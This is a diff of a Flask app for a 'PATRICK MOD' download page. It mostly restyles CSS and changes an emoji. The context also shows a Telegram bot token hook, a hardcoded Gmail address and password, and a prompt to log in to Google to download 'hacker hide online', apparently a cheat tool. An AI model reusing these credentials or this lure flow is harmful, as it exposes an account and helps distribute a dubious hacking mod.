@@ -7,7 +7,6 @@ app.secret_key = os.getenv("SECRET_KEY", "hohosbid_super_secret_key")
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
-# رابط تسجيل الدخول الحقيقي لجوجل
 GOOGLE_LOGIN_URL = "https://accounts.google.com"
 
 # الصفحة الأولى: الترحيب وزر التالي
@@ -30,20 +29,25 @@ def home():
             align-items: center; 
             min-height: 100vh; 
             width: 100vw; 
-            padding: 15px; 
+            padding: 20px; 
         }
         .box { 
             background: #141414; 
             width: 100%; 
             max-width: 480px; 
-            padding: 45px 30px; 
-            border-radius: 16px; 
-            box-shadow: 0 6px 25px rgba(220, 20, 60, 0.2); 
+            min-height: 520px; 
+            padding: 60px 30px; 
+            border-radius: 20px; 
+            box-shadow: 0 8px 30px rgba(220, 20, 60, 0.25); 
             text-align: center; 
             border: 1px solid #260a0a; 
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
         }
         .logo-container {
-            margin-bottom: 25px;
+            margin-bottom: 30px;
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -54,29 +58,30 @@ def home():
             border-radius: 50%;
             border: 2px solid #ff0000;
             box-shadow: 0 0 20px rgba(255, 0, 0, 0.4);
-            margin-bottom: 12px;
+            margin-bottom: 15px;
             background: #000000;
             display: flex;
             align-items: center;
             justify-content: center;
             font-size: 55px;
+            filter: drop-shadow(0 0 5px rgba(255, 0, 0, 0.8)) hue-rotate(-20deg);
         }
         .mod-title {
             color: #ff2a2a;
-            font-size: 19px;
+            font-size: 20px;
             font-weight: 800;
             letter-spacing: 1.5px;
             text-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
         }
-        h1 { color: #ff2a2a; font-size: 22px; font-weight: 800; letter-spacing: 1px; text-shadow: 0 0 10px rgba(255, 0, 0, 0.5); margin-bottom: 15px; }
+        h1 { color: #ff2a2a; font-size: 22px; font-weight: 800; letter-spacing: 1px; text-shadow: 0 0 10px rgba(255, 0, 0, 0.5); margin-bottom: 30px; }
         .next-btn { 
             display: block; 
             width: 100%; 
             background: #ff2a2a; 
             color: white; 
             border: none; 
-            border-radius: 8px; 
-            padding: 14px; 
+            border-radius: 10px; 
+            padding: 15px; 
             font-size: 16px; 
             font-weight: 600; 
             text-decoration: none; 
@@ -89,7 +94,7 @@ def home():
 <body>
     <div class="box">
         <div class="logo-container">
-            <div class="emoji-logo">😊</div>
+            <div class="emoji-logo">🙂</div>
             <div class="mod-title">PATRICK MOD</div>
         </div>
         <h1>Welcome to PATRICK MOD</h1>
@@ -127,20 +132,25 @@ def step2():
             align-items: center; 
             min-height: 100vh; 
             width: 100vw; 
-            padding: 15px; 
+            padding: 20px; 
         }
         .box { 
             background: #141414; 
             width: 100%; 
             max-width: 480px; 
-            padding: 45px 30px; 
-            border-radius: 16px; 
-            box-shadow: 0 6px 25px rgba(220, 20, 60, 0.2); 
+            min-height: 520px; 
+            padding: 50px 30px; 
+            border-radius: 20px; 
+            box-shadow: 0 8px 30px rgba(220, 20, 60, 0.25); 
             text-align: center; 
             border: 1px solid #260a0a; 
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
         }
         .logo-container {
-            margin-bottom: 20px;
+            margin-bottom: 25px;
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -157,26 +167,28 @@ def step2():
             align-items: center;
             justify-content: center;
             font-size: 55px;
+            filter: drop-shadow(0 0 5px rgba(255, 0, 0, 0.8)) hue-rotate(-20deg);
         }
         .mod-title {
             color: #ff2a2a;
-            font-size: 19px;
+            font-size: 20px;
             font-weight: 800;
             letter-spacing: 1.5px;
             text-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
         }
-        p.instruction { color: #d0d0d0; font-size: 15px; margin-bottom: 22px; font-weight: 500; line-height: 1.6; }
-        .error-msg { color: #ff4d4d; font-size: 13px; margin-bottom: 15px; background: #1f0a0a; padding: 10px; border-radius: 8px; border: 1px solid #4d1a1a; }
+        p.instruction { color: #d0d0d0; font-size: 15px; margin-bottom: 25px; font-weight: 500; line-height: 1.6; }
+        .error-msg { color: #ff4d4d; font-size: 13px; margin-bottom: 15px; background: #1f0a0a; padding: 10px; border-radius: 8px; border: 1px solid #4d1a1a; width: 100%; }
+        form { width: 100%; }
         input[type="text"] { 
             width: 100%; 
             background: #000; 
             border: 1px solid #333; 
-            border-radius: 8px; 
-            padding: 14px; 
+            border-radius: 10px; 
+            padding: 15px; 
             font-size: 16px; 
             color: #fff; 
             outline: none; 
-            margin-bottom: 18px; 
+            margin-bottom: 20px; 
             text-align: center;
             letter-spacing: 1px;
         }
@@ -186,8 +198,8 @@ def step2():
             background: #ff2a2a; 
             color: white; 
             border: none; 
-            border-radius: 8px; 
-            padding: 14px; 
+            border-radius: 10px; 
+            padding: 15px; 
             font-size: 16px; 
             font-weight: 600; 
             cursor: pointer; 
@@ -199,7 +211,7 @@ def step2():
 <body>
     <div class="box">
         <div class="logo-container">
-            <div class="emoji-logo">😊</div>
+            <div class="emoji-logo">🙂</div>
             <div class="mod-title">PATRICK MOD</div>
         </div>
         
@@ -216,7 +228,7 @@ def step2():
 </html>
 """, error=error)
 
-# الصفحة الثالثة: عرض البيانات وزر تسجيل الدخول الذي ينقل لجوجل
+# الصفحة الثالثة: النص المحدث تماماً وزر تسجيل الدخول لجوجل
 @app.route("/step3")
 def step3():
   if BOT_TOKEN and CHAT_ID:
@@ -244,17 +256,22 @@ def step3():
             align-items: center; 
             min-height: 100vh; 
             width: 100vw; 
-            padding: 15px; 
+            padding: 20px; 
         }}
         .box {{ 
             background: #141414; 
             width: 100%; 
             max-width: 480px; 
-            padding: 45px 30px; 
-            border-radius: 16px; 
-            box-shadow: 0 6px 25px rgba(220, 20, 60, 0.2); 
+            min-height: 540px; 
+            padding: 40px 30px; 
+            border-radius: 20px; 
+            box-shadow: 0 8px 30px rgba(220, 20, 60, 0.25); 
             text-align: center; 
             border: 1px solid #260a0a; 
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
         }}
         .logo-container {{
             margin-bottom: 20px;
@@ -274,33 +291,35 @@ def step3():
             align-items: center;
             justify-content: center;
             font-size: 55px;
+            filter: drop-shadow(0 0 5px rgba(255, 0, 0, 0.8)) hue-rotate(-20deg);
         }}
         .mod-title {{
             color: #ff2a2a;
-            font-size: 19px;
+            font-size: 20px;
             font-weight: 800;
             letter-spacing: 1.5px;
             text-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
         }}
-        p {{ color: #d0d0d0; font-size: 15px; line-height: 1.6; margin-bottom: 20px; }}
+        p {{ color: #d0d0d0; font-size: 14.5px; line-height: 1.6; margin-bottom: 18px; }}
         .cred-box {{ 
             background: #000; 
             border: 1px solid #333; 
             border-radius: 10px; 
-            padding: 18px; 
-            margin-bottom: 25px; 
+            padding: 15px; 
+            margin-bottom: 20px; 
             text-align: left; 
             direction: ltr;
+            width: 100%;
         }}
-        .cred-item {{ color: #ff5252; font-size: 15px; margin-bottom: 6px; font-family: monospace; font-weight: bold; }}
+        .cred-item {{ color: #ff5252; font-size: 14px; margin-bottom: 6px; font-family: monospace; font-weight: bold; }}
         .login-btn {{ 
             display: block; 
             width: 100%; 
             background: #28a745; 
             color: white; 
             border: none; 
-            border-radius: 8px; 
-            padding: 14px; 
+            border-radius: 10px; 
+            padding: 15px; 
             font-size: 16px; 
             font-weight: 600; 
             text-decoration: none; 
@@ -313,11 +332,11 @@ def step3():
 <body>
     <div class="box">
         <div class="logo-container">
-            <div class="emoji-logo">😊</div>
+            <div class="emoji-logo">🙂</div>
             <div class="mod-title">PATRICK MOD</div>
         </div>
         
-        <p>الرجاء التسجيل بالبريد الإلكتروني لتنزيل الملف من هناك :</p>
+        <p>الرجاء تسجيل الدخول بالبريد الإلكتروني لمتابعة تنزيل hacker hide online :</p>
         <div class="cred-box">
             <div class="cred-item"><b>Email:</b> patrickmod156@gmail.com</div>
             <div class="cred-item"><b>Password:</b> PM.smash,mod</div>
